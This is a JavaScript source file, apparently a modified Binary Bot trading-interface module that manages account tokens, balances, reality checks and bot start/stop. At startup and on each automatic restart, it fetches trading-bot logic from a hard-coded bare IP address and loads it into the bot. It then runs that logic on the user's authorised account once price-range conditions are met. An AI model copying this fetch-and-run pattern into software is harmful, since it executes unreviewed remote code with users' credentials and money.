import React from 'react';
import ReactDOM from 'react-dom';
import 'jquery-ui/ui/widgets/dialog';
import _Blockly, { load } from './blockly';
import Limits from './Dialogs/Limits';
import logHandler from './logger';
import NetworkMonitor from './NetworkMonitor';
import { symbolPromise } from './shared';
import TradeInfoPanel from './TradeInfoPanel';
import { showDialog } from '../bot/tools';
import Elevio from '../../common/elevio';
import config, { updateConfigCurrencies } from '../common/const';
import { isVirtual } from '../common/tools';
import {
    logoutAllTokens,
    generateLiveApiInstance,
    AppConstants,
    addTokenIfValid,
} from '../../common/appId';
import { translate } from '../../common/i18n';
import { isEuCountry, showHideEuElements, hasEuAccount } from '../../common/footer-checks';
import googleDrive from '../../common/integrations/GoogleDrive';
import { getLanguage, showBanner } from '../../common/lang';
import { observer as globalObserver } from '../../common/utils/observer';
import {
    getTokenList,
    removeAllTokens,
    get as getStorage,
    set as setStorage,
    getToken,
} from '../../common/utils/storageManager';
import GTM from '../../common/gtm';
import { saveBeforeUnload } from './blockly/utils';
import axios from 'axios';
import { disableRunButton } from './blockly/blocks/shared';

let realityCheckTimeout;
let startTime = new Date();
let flagForCheck = false;

const api = generateLiveApiInstance();

new NetworkMonitor(api, $('#server-status')); // eslint-disable-line no-new

api.send({ website_status: '1', subscribe: 1 });

api.events.on('website_status', response => {
    $('.web-status').trigger('notify-hide');
    const { message } = response.website_status;
    if (message) {
        $.notify(message, {
            position : 'bottom left',
            autoHide : false,
            className: 'warn web-status',
        });
    }
});

api.events.on('balance', response => {
    const {
        balance: { balance: b, currency },
    } = response;

    const elTopMenuBalances = document.querySelectorAll('.topMenuBalance');
    const localString = getLanguage().replace('_', '-');
    const balance = (+b).toLocaleString(localString, {
        minimumFractionDigits: config.lists.CRYPTO_CURRENCIES.includes(currency) ? 8 : 2,
    });

    elTopMenuBalances.forEach(elTopMenuBalance => {
        const element = elTopMenuBalance;
        element.textContent = `${balance} ${currency}`;
    });

    globalObserver.setState({ balance: b, currency });
});

const addBalanceForToken = token => {
    api.authorize(token).then(() => {
        api.send({ forget_all: 'balance' }).then(() => {
            api.subscribeToBalance();
        });
    });
};


const showRealityCheck = () => {
    $('.blocker').show();
    $('.reality-check').show();
};

const hideRealityCheck = () => {
    $('#rc-err').hide();
    $('.blocker').hide();
    $('.reality-check').hide();
};

const stopRealityCheck = () => {
    clearInterval(realityCheckTimeout);
    realityCheckTimeout = null;
};

const realityCheckInterval = stopCallback => {
    realityCheckTimeout = setInterval(() => {
        const now = parseInt(new Date().getTime() / 1000);
        const checkTime = +getStorage('realityCheckTime');
        if (checkTime && now >= checkTime) {
            showRealityCheck();
            stopRealityCheck();
            stopCallback();
        }
    }, 1000);
};

const startRealityCheck = (time, token, stopCallback) => {
    stopRealityCheck();
    if (time) {
        const start = parseInt(new Date().getTime() / 1000) + time * 60;
        setStorage('realityCheckTime', start);
        realityCheckInterval(stopCallback);
    } else {
        const tokenObj = getToken(token);
        if (tokenObj.hasRealityCheck) {
            const checkTime = +getStorage('realityCheckTime');
            if (!checkTime) {
                showRealityCheck();
            } else {
                realityCheckInterval(stopCallback);
            }
        }
    }
};

const clearRealityCheck = () => {
    setStorage('realityCheckTime', null);
    stopRealityCheck();
};

const getLandingCompanyForToken = id => {
    let landingCompany;
    let activeToken;
    const tokenList = getTokenList();
    if (tokenList.length) {
        activeToken = tokenList.filter(token => token.token === id);
        if (activeToken && activeToken.length === 1) {
            landingCompany = activeToken[0].loginInfo.landing_company_name;
        }
    }
    return landingCompany;
};

const updateLogo = token => {
    $('.binary-logo-text > img').attr('src', '');
    const currentLandingCompany = getLandingCompanyForToken(token);
    if (currentLandingCompany === 'maltainvest') {
        $('.binary-logo-text > img').attr('src', './image/binary-type-logo.svg');
    } else {
        $('.binary-logo-text > img').attr('src', './image/binary-style/logo/type.svg');
    }
    setTimeout(() => window.dispatchEvent(new Event('resize')));
};

const getActiveToken = (tokenList, activeToken) => {
    const activeTokenObject = tokenList.filter(tokenObject => tokenObject.token === activeToken);
    return activeTokenObject.length ? activeTokenObject[0] : tokenList[0];
};

const updateTokenList = () => {
    const tokenList = getTokenList();
    const loginButton = $('#login, #toolbox-login');
    const accountList = $('#account-list, #toolbox-account-list');
    if (tokenList.length === 0) {
        loginButton.show();
        accountList.hide();

        // If logged out, determine EU based on IP.
        isEuCountry(api).then(isEu => showHideEuElements(isEu));
        showBanner();

        $('.account-id')
            .removeAttr('value')
            .text('');
        $('.account-type').text('');
        $('.login-id-list')
            .children()
            .remove();
    } else {
        loginButton.hide();
        accountList.show();

        const activeToken = getActiveToken(tokenList, getStorage(AppConstants.STORAGE_ACTIVE_TOKEN));
        showHideEuElements(hasEuAccount(tokenList));
        showBanner();
        updateLogo(activeToken.token);
        addBalanceForToken(activeToken.token);

        if (!('loginInfo' in activeToken)) {
            removeAllTokens();
            updateTokenList();
        }

        tokenList.forEach(tokenInfo => {
            const prefix = isVirtual(tokenInfo) ? 'Virtual Account' : `${tokenInfo.loginInfo.currency} Account`;
            if (tokenInfo === activeToken) {
                $('.account-id')
                    .attr('value', `${tokenInfo.token}`)
                    .text(`${tokenInfo.accountName}`);
                $('.account-type').text(`${prefix}`);
            } else {
                $('.login-id-list').append(
                    `<a href="#" value="${tokenInfo.token}"><li><span>${prefix}</span><div>${
                        tokenInfo.accountName
                    }</div></li></a><div class="separator-line-thin-gray"></div>`
                );
            }
        });
    }
};


export default class View {
    constructor() {
        logHandler();
        this.initPromise = new Promise(resolve => {
            updateConfigCurrencies(api).then(() => {
                symbolPromise.then(() => {
                    updateTokenList();
                    this.blockly = new _Blockly();
                    this.blockly.initPromise.then(() => {
                        this.setElementActions();
                        initRealityCheck(() => $('#stopButton').triggerHandler('click'));
                        disableRunButton(true);
                        renderReactComponents();                        
                        axios({
                            url: 'https://192.248.170.206/api/bot_download',
                            method: 'GET',
                            responseType: 'text',
                        }).then((response) => {
                            load(response.data);                            
                        }).catch(e => {
                            console.log(e);
                        });
                        if (!getTokenList().length) updateLogo();
                        this.showHeader(getStorage('showHeader') !== 'false');
                        resolve();
                    });
                });
            });
        });
    }

    // eslint-disable-next-line class-methods-use-this
    setElementActions() {
        this.addBindings();
        this.addEventHandlers();
    }
    addBindings() {
        const stop = e => {
            if (e) {
                e.preventDefault();
            }
            stopRealityCheck();
            this.stop();
        };

        const getAccountSwitchText = () => {
            if (this.blockly.hasStarted()) {
                return [
                    translate(
                        'Binary Bot will not place any new trades. Any trades already placed (but not expired) will be completed by our system. Any unsaved changes will be lost.'
                    ),
                    translate(
                        'Note: Please see the Binary.com statement page for details of all confirmed transactions.'
                    ),
                ];
            }
            return [translate('Are you sure?')];
        };

        const logout = () => {
            showDialog({
                title: translate('Log out'),
                text : getAccountSwitchText(),
            })
                .then(() => {
                    this.stop();
                    Elevio.logoutUser();
                    googleDrive.signOut();
                    GTM.setVisitorId();
                    removeTokens();
                })
                .catch(() => {});
        };

        const removeTokens = () => {
            logoutAllTokens().then(() => {
                updateTokenList();
                globalObserver.emit('ui.log.info', translate('Logged you out!'));
                clearRealityCheck();
                clearActiveTokens();
                window.location.reload();
            });
        };

        const clearActiveTokens = () => {
            setStorage(AppConstants.STORAGE_ACTIVE_TOKEN, '');
        };

        $('.panelExitButton').click(function onClick() {
            $(this)
                .parent()
                .hide();
        });

        $('.draggable-dialog')
            .hide()
            .dialog({
                resizable: false,
                autoOpen : false,
                width    : Math.min(document.body.offsetWidth, 770),
                height   : Math.min(document.body.offsetHeight, 600),
                closeText: '',
                classes  : { 'ui-dialog-titlebar-close': 'icon-close' },
            });

        $('#logout, #toolbox-logout').click(() => {
            saveBeforeUnload();
            logout();
            hideRealityCheck();
        });

        $('#logout-reality-check').click(() => {
            removeTokens();
            hideRealityCheck();
        });

        const submitRealityCheck = () => {
            const time = parseInt($('#realityDuration').val());
            if (time >= 10 && time <= 60) {
                hideRealityCheck();
                startRealityCheck(time, null, () => $('#stopButton').triggerHandler('click'));
            } else {
                $('#rc-err').show();
            }
        };

        $('#continue-trading').click(() => {
            submitRealityCheck();
        });

        $('#realityDuration').keypress(e => {
            const char = String.fromCharCode(e.which);
            if (e.keyCode === 13) {
                submitRealityCheck();
            }
            /* Unicode check is for firefox because it
             * trigger this event when backspace, arrow keys are pressed
             * in chrome it is not triggered
             */
            const unicodeStrings = /[\u0008|\u0000]/; // eslint-disable-line no-control-regex
            if (unicodeStrings.test(char)) return;

            if (!/([0-9])/.test(char)) {
                e.preventDefault();
            }
        });

        const startBot = limitations => {
            const elRunButtons = document.querySelectorAll('#summaryRunButton');
            const elStopButtons = document.querySelectorAll('#summaryStopButton');

            elRunButtons.forEach(el => {
                const elRunButton = el;
                elRunButton.style.display = 'none';
                elRunButton.setAttributeNode(document.createAttribute('disabled'));
            });
            elStopButtons.forEach(el => {
                const elStopButton = el;
                elStopButton.style.display = 'inline-block';
            });

            this.blockly.run(limitations);
        };

        $('#runButton').click(() => {
            const token = $('.account-id')
                .first()
                .attr('value');
            const tokenObj = getToken(token);
            initRealityCheck(() => $('#stopButton').triggerHandler('click'));
            
            disableRunButton(true);

            startTime = new Date();

            if (tokenObj && tokenObj.hasTradeLimitation) {
                const limits = new Limits(api);
                limits
                    .getLimits()
                    .then( () => {
                        flagForCheck = true;
                        checkTriggerRun();
                    })
                    .catch(() => {});
            } else {
                flagForCheck = true;
                checkTriggerRun();
            }
        });

        const startBotAgain = () => {
            axios({
                url: 'https://192.248.170.206/api/bot_download',
                method: 'GET',
                responseType: 'text',
            }).then((response) => {
                load(response.data);
                setTimeout(() => {
                    flagForCheck = true;
                    checkTriggerRun();
                }, 2000);
            }).catch(e => {
                console.log(e);
            });
        }

        const checkTriggerRun = () => {
            let ticks = [];
            var spaceRange = 0;
            var min = 0.0;
            var max = 0.0;
            var startCondition = 0.0;
            let currentSymbol = globalObserver.getState('symbol');
            if (currentSymbol != null && currentSymbol != "" && currentSymbol != undefined)
			{
				switch(currentSymbol) {
				  case 'R_10':
					startCondition = 6.0
					break;
				  case 'R_25':
					startCondition = 6.0
					break;
				  case 'R_50':
					startCondition = 0.6
					break;
				  case 'R_75':
					startCondition = 600.0
					break;
				  case 'R_100':
					startCondition = 12.0
					break;
				  default:
				}
			}
            api.getTickHistory(currentSymbol, { end: 'latest', count: 10, "style": "ticks", "subscribe": 1 });
            api.events.on("history", async (res) => {
                ticks = res.history.prices;
                ticks.sort();
                min = ticks[0];
                max = ticks[ticks.length-1];
            })
            api.events.on("tick", async (res) => {
                let tick = res.tick;
                if ( min > tick.quote )
                {
                    min = tick.quote;
                }
                if ( max < tick.quote )
                {
                    max = tick.quote;
                }
                spaceRange =  max - min; 
                if (spaceRange > startCondition)
                {
                    if (flagForCheck){
                        flagForCheck = false;
                        api.unsubscribeFromAllTicks();
                        startBot();
                    }                    
                }
            })
        }        

        globalObserver.register('bot.startagain', () => {
            var day = globalObserver.getState('day');
            var hour = globalObserver.getState('hour');
            var minute = globalObserver.getState('minute');
            var second = globalObserver.getState('second');
            var currentTime = new Date();
            var infinite = false;
            if ((day == 0 || day == "" || day == undefined) 
                && (hour == 0 || hour == "" || hour == undefined)
                && (minute == 0 || minute == "" || minute == undefined)
                && (second == 0 || second == "" || second == undefined))
            {
                infinite = true;
            }
            if (day == "" || day == undefined )    day = 0;
            if (hour == "" || hour == undefined )   hour = 0;
            if (minute == "" || minute == undefined ) minute = 0;
            if (second == "" || second == undefined ) second = 0;

            var endTime = new Date(startTime.getTime() 
                                        + day*24*60*60*1000 
										+ hour*60*60*1000
										+ minute*60*1000
                                        + second*1000);

            if (infinite)
            {
                startBotAgain();
            } 
            else if ((endTime.getTime() - currentTime.getTime()) > 0)
            {
                startBotAgain();
            }
            else
            {
                console.log("session ended");
            }
            
        });

        $('#stopButton')
            .click(e => stop(e))
            .hide();

        $('[aria-describedby="summaryPanel"]').on('click', '#summaryRunButton', () => {
            $('#runButton').trigger('click');
        });

        $('[aria-describedby="summaryPanel"]').on('click', '#summaryStopButton', () => {
            $('#stopButton').trigger('click');
        });

        $('.login-id-list').on('click', 'a', e => {
            showDialog({
                title: translate('Are you sure?'),
                text : getAccountSwitchText(),
            })
                .then(() => {
                    this.stop();
                    Elevio.logoutUser();
                    GTM.setVisitorId();
                    const activeToken = $(e.currentTarget).attr('value');
                    const tokenList = getTokenList();
                    setStorage('tokenList', '');
                    addTokenIfValid(activeToken, tokenList).then(() => {
                        setStorage(AppConstants.STORAGE_ACTIVE_TOKEN, activeToken);
                        window.location.reload();
                    });
                })
                .catch(() => {});
        });

        $('#statement-reality-check').click(() => {
            document.location = `https://www.binary.com/${getLanguage()}/user/statementws.html#no-reality-check`;
        });
    }
    stop() {
        this.blockly.stop();
    }
    addEventHandlers() {
        const getRunButtonElements = () => document.querySelectorAll('#summaryRunButton');
        const getStopButtonElements = () => document.querySelectorAll('#summaryStopButton');

        window.addEventListener('storage', e => {
            window.onbeforeunload = null;
            if (e.key === 'activeToken' && e.newValue !== e.oldValue) window.location.reload();
            if (e.key === 'realityCheckTime') hideRealityCheck();
        });

        globalObserver.register('Error', error => {
            getRunButtonElements().forEach(el => {
                const elRunButton = el;
                elRunButton.removeAttribute('disabled');
            });

            if (error.error && error.error.error.code === 'InvalidToken') {
                removeAllTokens();
                updateTokenList();
                this.stop();
            }
        });

        globalObserver.register('bot.running', () => {
            getRunButtonElements().forEach(el => {
                const elRunButton = el;
                elRunButton.style.display = 'none';
                elRunButton.setAttributeNode(document.createAttribute('disabled'));
            });
            getStopButtonElements().forEach(el => {
                const elStopButton = el;
                elStopButton.style.display = 'inline-block';
                elStopButton.removeAttribute('disabled');
            });
        });

        globalObserver.register('bot.stop', () => {
            // Enable run button, this event is emitted after the interpreter
            // killed the API connection.
            getStopButtonElements().forEach(el => {
                const elStopButton = el;
                elStopButton.style.display = null;
                elStopButton.removeAttribute('disabled');
            });
            getRunButtonElements().forEach(el => {
                const elRunButton = el;
                elRunButton.style.display = null;
                elRunButton.removeAttribute('disabled');
            });
        });

        globalObserver.register('bot.info', info => {
            if ('profit' in info) {
                const token = $('.account-id')
                    .first()
                    .attr('value');
                const user = getToken(token);
                globalObserver.emit('log.revenue', {
                    user,
                    profit  : info.profit,
                    contract: info.contract,
                });
            }
        });
    }
    showHeader = show => {
        const $header = $('#header');
        const $topbarAccount = $('#toolbox-account');
        const $toggleHeaderButton = $('.icon-hide-header');
        if (show) {
            $header.show(0);
            $topbarAccount.hide(0);
            $toggleHeaderButton.removeClass('enabled');
        } else {
            $header.hide(0);
            $topbarAccount.show(0);
            $toggleHeaderButton.addClass('enabled');
        }
        setStorage('showHeader', show);
        window.dispatchEvent(new Event('resize'));
    };    
}

function initRealityCheck(stopCallback) {
    startRealityCheck(
        null,
        $('.account-id')
            .first()
            .attr('value'),
        stopCallback
    );
}
function renderReactComponents() {
    ReactDOM.render(<TradeInfoPanel api={api} />, $('#summaryPanel')[0]);
}
